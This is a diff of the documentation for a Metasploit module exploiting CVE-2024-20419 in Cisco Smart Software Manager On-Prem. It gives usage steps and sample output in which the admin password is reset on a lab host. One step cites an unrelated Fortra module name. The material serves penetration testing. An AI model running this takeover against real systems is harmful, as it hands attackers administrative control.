@@ -1,7 +1,7 @@
 ## Vulnerable Application
 
-This module exploits an account takeover vulnerability in Cisco SSM On-Prem <= 8-202206 (CVE-2024-20419), by changing the password of the
-admin user.
+This module exploits an improper access control vulnerability in Cisco Smart Software Manager (SSM) On-Prem <= 8-202206 (CVE-2024-20419),
+by changing the password of the admin user.
 
 The vendor published an advisory [here]
 (https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cssm-auth-sLw3uhUy). The original research blog
@@ -16,42 +16,40 @@ Deploy it by following the vendor's [installation guide]
 
 **Successfully tested on**
 
-- Cisco Smart Software Manager v8-202206.
+- Cisco Smart Software Manager (SSM) On-Prem v8-202206.
 
 ## Verification Steps
 
-1. Deploy Cisco Smart Software Manager v8-202206
+1. Deploy Cisco Smart Software Manager (SSM) On-Prem v8-202206
 2. Start `msfconsole`
 3. `use auxiliary/admin/http/fortra_filecatalyst_workflow_sqli`
 4. `set RHOSTS <IP>`
-5. `set NEW_PASSWORD <password>`
-6. `run`
-7. A new password should have been set for the admin account.
+5. `run`
+6. A new password should have been set for the admin account.
 
 ## Options
 
+### USER
+The user of which the password should be changed (default: admin)
 ### NEW_PASSWORD
 Password to be used when creating a new user with admin privileges.
 
 ## Scenarios
 
-Running the module against Smart Software Manager v8-202206 should result in an output
+Running the module against Smart Software Manager (SSM) On-Prem v8-202206 should result in an output
 similar to the following:
 
 ```
 msf6 > use auxiliary/admin/http/cisco_ssm_onprem_account 
 msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > set RHOSTS 192.168.137.200
-msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > set SSL true
 msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > exploit 
 [*] Running module against 192.168.137.200
 
-[*] Starting workflow...
 [+] Server reachable.
-[*] xsrf_token: B%2BxNjt72KTh%2BW%2FYhUkSFpTKE5uM1NUkZdBMkle5C1DDpr9P9lPyPDN556BImuPHfSsdy4W4blO8R%2BvtX%2FLK%2B1A%3D%3D
-[*] xsrf_token: B+xNjt72KTh+W/YhUkSFpTKE5uM1NUkZdBMkle5C1DDpr9P9lPyPDN556BImuPHfSsdy4W4blO8R+vtX/LK+1A==
-[*] _lic_engine_session: f517481befa8b1a7cddcb1d755b8163c
-[+] Server reachable.
-[*] auth_token: 21bf4695d594af3bd5f0f07db2ce8f09f29abe6f9295e2649e3fa5f266ada2a1
-[+] Server reachable.
+[+] Retrieved XSRF Token: RAjYUE7aNosSoXUHQu3S2VWj2h+t5ioGFCV8PwMIkNIkX15f1H10sJJY5V1yTG6tsSkhonOIr2lI3VhseclCRw==
+[+] Retrieved _lic_engine_session: 22b193146b9071bbf695182f22bfcb09
+[+] Retrieved auth_token: 73e63ab74a07d9d4099d0c9918c21ceaad1c2db94058b32aa6d990178dbe13b5
+[+] Password for the admin user was successfully updated: Epd45bZ9OCJIFiEr!
+[+] Login at: http://192.168.137.200:8443/#/logIn?redirectURL=%2F
 [*] Auxiliary module execution completed
 ```
